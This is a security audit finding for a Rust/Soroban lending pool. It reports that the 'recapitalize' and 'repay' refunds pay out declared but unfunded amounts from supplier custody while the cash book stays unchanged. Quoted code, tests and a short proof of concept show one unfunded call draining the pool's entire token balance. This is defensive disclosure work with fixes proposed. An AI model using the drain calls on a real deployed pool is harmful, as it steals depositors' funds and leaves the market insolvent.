### Title
Pool `recapitalize`/`repay` refunds pay declared-but-unfunded "excess" out of real custody without debiting the cash book — (File: contracts/pool/src/ops/recapitalize.rs)

### Summary
The WHALE exploit's class — a transfer pipeline where declared accounting and real token custody desynchronize, letting the attacker extract an imbalance — maps directly onto the pool's refund legs. `ops::recapitalize::accounting` and `ops::repay::accounting` compute a refund as `amount - applied` / `amount - net_repay` from the *declared* `action.amount`, then `transfer_out` pays that refund from the pool's token balance while `cash` is credited only by the applied/net part. Nothing in the pool verifies that `amount` tokens were actually transferred in — the comment states only "The controller transfers `amount` into the pool before this call" [1](#0-0) . A direct call to `pool::recapitalize` (or `pool::repay` on a zero-debt market) with `payer = attacker` and `amount = pool token balance` therefore refunds the entire declared amount out of supplier custody while the `cash` book is untouched.

### Finding Description
In `ops::recapitalize::accounting`, `applied = amount.min(backing_shortfall)` and `refund = amount - applied`; `apply` then calls `outcome.cache.transfer_out(&payer, outcome.refund)` [2](#0-1) . The refund transfer is a real SAC token transfer paid from pool custody, but `credit_cash` is called only for `applied`, so a fully unfunded call leaves `cash` overstating custody [3](#0-2) .

`ops::repay::apply` has the same shape: `overpayment = amount - net_repay` is transferred to `payer` while only `net_repay` is credited to cash [4](#0-3) . On a market with no outstanding debt, `resolve_repay` takes the full-close branch, `net_repay == 0`, the `RepayRoundsToZeroShares` assert passes on its `net_repay == 0` disjunct, and the whole declared amount is refunded from custody [5](#0-4) .

The repository's own tests already prove the mechanics: `test_unfunded_recapitalize_leaves_the_cash_book_overstating_custody` calls `client.recapitalize(&hub, &payer, &custody)` with no inbound transfer, asserts `token.balance(&pool) == 0` while the `cash` book still claims the supplier's deposit, and shows a subsequent supplier `withdraw` clears `require_reserves` (which reads the book) and fails inside the SAC transfer with `BalanceError = 10` [6](#0-5) . `test_unfunded_repay_overpayment_refund_also_pays_out_of_custody` proves the identical drain through `repay` on a zero-debt market [7](#0-6) . INV-ACCT-03 ("token-funded credit uses measured receipt") is violated on the outbound side: the refund is measured against the declared amount, not the measured balance increase [8](#0-7) .

### Impact Explanation
Theft of user funds and protocol insolvency. If the pool's `recapitalize`/`repay` entrypoints are reachable by an unprivileged caller (the unit tests invoke them directly with no auth setup, and the pool's trust model is that the controller pre-funds — no inbound-transfer check exists in-pool), the attacker declares `amount` equal to the pool's token balance and receives the full custody as a "refund". Alternatively, even a funded call over-declares: on a zero-debt market every repaid unit is "overpayment" refunded back, but any discrepancy between what actually arrived and the declared amount is paid from supplier funds. After the drain, `cash` still reports the stolen funds as present, so every subsequent withdraw/borrow passes `require_reserves` and then reverts in the token transfer — the market reports itself solvent and cannot pay, permanently freezing supplier principal until governance intervention.

### Likelihood Explanation
Likelihood hinges on whether `pool::recapitalize`/`pool::repay` enforce controller-only callers; `contracts/pool/src/lib.rs` could not be fully inspected within the tool budget (grep returned match counts only). The pool unit tests call both functions directly on the pool client with freshly generated addresses and no auth mocking, which strongly suggests no per-call authorization gate — Soroban `require_auth` would otherwise abort the test. Even if a caller check exists, the funded-path variant (over-declared `repay` where measured receipt < declared) remains a live desync vector whenever the controller's measured amount and the pool's declared `action.amount` can diverge, e.g. through a direct token transfer sandwiched into the same transaction. Severity is Critical/High on the unfunded path, Medium on the funded-mismatch path.

### Recommendation
- Base refunds on the pool's *measured* balance delta for the call (consistent with INV-ACCT-03), not on `action.amount - applied`; debit `cash` for any refund paid out, or compute `refund = measured_received - applied` so a zero-receipt call refunds zero.
- Add an explicit caller authorization (controller address) to pool `recapitalize`, `repay`, `supply`, `withdraw`, `borrow`, and `seize` entrypoints if not already present, so the "controller transfers before this call" precondition cannot be bypassed.
- Reconcile custody after each op: assert `token.balance(pool) >= sum of cash across markets on this asset` post-transfer, matching the fuzzer's `assert_cash_matches_balance` property [9](#0-8) .

### Proof of Concept
The existing test suite is the PoC:

```rust
// contracts/pool/tests/flows.rs — test_unfunded_recapitalize_leaves_the_cash_book_overstating_custody
let custody = token.balance(&t.pool);
// No token transfer in. The declared amount alone drives the refund.
t.client().recapitalize(&hub(&t.asset), &payer, &custody);
assert_eq!(token.balance(&t.pool), 0);          // all supplier custody stolen
assert!(t.state_snapshot().cash >= deposit);    // book still claims solvency
// Supplier withdraw passes require_reserves, then fails in the SAC transfer
// with BalanceError = 10: funds permanently unwithdrawable.
```

And the parallel path:

```rust
// contracts/pool/tests/flows.rs — test_unfunded_repay_overpayment_refund_also_pays_out_of_custody
t.client().repay(&payer, &t.ract(0, custody_before));
// market has zero debt → entire declared amount is "overpayment",
// refunded from custody, cash book unchanged.
```

Both calls are single-invocation, require no collateral, no position, and no privileged role per the test harness's own execution.

### Citations

**File:** contracts/pool/src/ops/recapitalize.rs (L1-4)
```rust
//! Recapitalization: injects cash to cover a market backing shortfall.
//!
//! Only the shortfall amount is applied; any excess is refunded to the payer.
//! The controller transfers `amount` into the pool before this call.
```

**File:** contracts/pool/src/ops/recapitalize.rs (L32-38)
```rust
    let outcome = accounting(env, hub_asset, amount);

    outcome.cache.transfer_out(&payer, outcome.refund);

    events::emit_market_state(env, outcome.cache.snapshot());
    outcome.mutation
}
```

**File:** contracts/pool/src/ops/recapitalize.rs (L52-58)
```rust
    let applied = amount.min(guards::backing_shortfall(&cache));
    let refund = amount
        .checked_sub(applied)
        .unwrap_or_else(|| panic_with_error!(env, GenericError::MathOverflow));

    cache.credit_cash(applied);
    cache.commit();
```

**File:** contracts/pool/src/ops/repay.rs (L30-34)
```rust
    let outcome = accounting(env, action);

    outcome.cache.transfer_out(payer, outcome.overpayment);
    (outcome.mutation, outcome.snapshot)
}
```

**File:** contracts/pool/src/ops/repay.rs (L44-57)
```rust
    let (burned, overpayment) = cache.resolve_repay(amount, position);
    let net_repay = amount
        .checked_sub(overpayment)
        .unwrap_or_else(|| panic_with_error!(env, GenericError::MathOverflow));
    assert_with_error!(
        env,
        net_repay == 0 || burned.raw() > 0,
        GenericError::RepayRoundsToZeroShares
    );

    let position = position.checked_sub(env, burned);
    cache.burn_debt(burned);

    cache.credit_cash(net_repay);
```

**File:** contracts/pool/tests/flows.rs (L3404-3450)
```rust
/// After an unfunded refund, `cash` overstates custody. `Cache::require_reserves`
/// reads the book, not the balance, so it admits exits that then fail inside
/// the SAC transfer. The market reports itself solvent and cannot pay.
#[test]
fn test_unfunded_recapitalize_leaves_the_cash_book_overstating_custody() {
    let t = TestSetup::new();
    let token = token::Client::new(&t.env, &t.asset);
    let token_admin = token::StellarAssetClient::new(&t.env, &t.asset);
    let payer = Address::generate(&t.env);
    let receiver = Address::generate(&t.env);

    // A legitimate supplier, with custody moved in as the controller would.
    let deposit = 10_000_000_000i128;
    token_admin.mint(&t.pool, &deposit);
    let supplied = t
        .client()
        .supply(&t.sup(0, deposit))
        .get_unchecked(0)
        .position
        .scaled_amount;
    assert_eq!(
        t.state_snapshot().cash,
        token.balance(&t.pool),
        "fixture guard: book and custody must still agree after the deposit"
    );

    // Drain every token via an unfunded refund.
    let custody = token.balance(&t.pool);
    t.client().recapitalize(&hub(&t.asset), &payer, &custody);
    assert_eq!(token.balance(&t.pool), 0, "custody is gone");

    let book = t.state_snapshot().cash;
    assert!(
        book >= deposit,
        "the book still claims more than the supplier's deposit: {book}"
    );

    // The supplier's exit clears the pool's own liquidity guard -- the book
    // says the cash is there -- and then fails in the token transfer.
    let outcome = t
        .client()
        .try_withdraw(&receiver, &false, &t.wdr(supplied, i128::MAX, 0));
    assert!(
        outcome.is_err(),
        "the withdraw cannot be paid, so it must fail"
    );
    // The failure must come from custody, not from a pool guard. The SAC
```

**File:** contracts/pool/tests/flows.rs (L3578-3611)
```rust
/// The refund gap is not specific to `recapitalize`. Two pool legs refund an
/// excess derived from a declared inbound amount, not from the cash book:
/// `ops::recapitalize::apply` (the excess over the shortfall) and
/// `ops::repay::apply` (the excess over the debt). Neither refund debits `cash`
/// or passes `require_reserves`.
///
/// A repay against a market with no debt makes the entire declared amount an
/// overpayment: `current_debt_ceil` is zero, so `resolve_repay` takes the
/// full-close branch and `net_repay` is zero. The `RepayRoundsToZeroShares`
/// assert in `ops::repay::accounting` passes on its `net_repay == 0` disjunct,
/// and the whole amount is refunded out of real custody with the book untouched.
#[test]
fn test_unfunded_repay_overpayment_refund_also_pays_out_of_custody() {
    let t = TestSetup::new();
    let token = token::Client::new(&t.env, &t.asset);
    let payer = Address::generate(&t.env);

    let custody_before = token.balance(&t.pool);
    let before = t.state_snapshot();
    assert_eq!(
        before.cash, custody_before,
        "fixture guard: book and custody must start in sync"
    );
    assert_eq!(before.borrowed, 0, "fixture must carry no debt");

    // Nothing transferred in, no debt to retire: the whole amount is "excess".
    let credited = t
        .client()
        .repay(&payer, &t.ract(0, custody_before))
        .get_unchecked(0)
        .actual_amount;
    assert_eq!(credited, 0, "no debt was retired, so nothing is credited");
    assert_unfunded_refund_drained_custody(&t, &payer, custody_before, &before);
}
```

**File:** docs/reference/invariants.md (L114-119)
```markdown
### INV-ACCT-03 — Token-funded credit uses measured receipt

Token-funded supply, repayment and recapitalization credit the pool's measured
balance increase. Strategy supply follows the same supply path, and strategy
repayment also measures pool receipt. Requested amounts alone do not determine
credit.
```

**File:** tests/fuzz/fuzz_targets/pool_native.rs (L101-123)
```rust
/// Asserts that the driven and sibling market cash sums to at most the pool token balance.
///
/// Markets on one asset share the token balance, so a per-market `cash <= balance`
/// check cannot detect an overdraw.
fn assert_cash_matches_balance(
    env: &Env,
    pool: &LiquidityPoolClient<'_>,
    pool_addr: &Address,
    asset: &Address,
    state: &PoolStateRaw,
) {
    let sibling = pool_state(pool, &hub_asset_in(asset, SIBLING_HUB_ID)).cash;
    let tracked = state.cash + sibling;
    let balance = pool_balance(env, asset, pool_addr);
    assert!(
        tracked <= balance,
        "tracked cash across markets on this asset exceeds token balance: \
         driven={} sibling={} balance={}",
        state.cash,
        sibling,
        balance,
    );
}
```
